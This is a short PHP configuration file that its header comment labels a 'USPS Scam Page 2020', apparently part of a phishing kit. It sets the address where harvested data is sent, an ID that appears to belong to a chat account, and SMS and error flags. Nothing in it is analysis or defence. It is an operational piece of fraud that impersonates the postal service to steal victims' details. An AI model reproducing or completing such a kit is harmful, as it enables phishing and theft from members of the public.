<?php
/* 
USPS Scam Page 2020
CODED BY ARON-TN
*/
$to="darkhack390@aol.com";
$user_ids=array("1125264287");
$sms='1';
$error='1';
?>
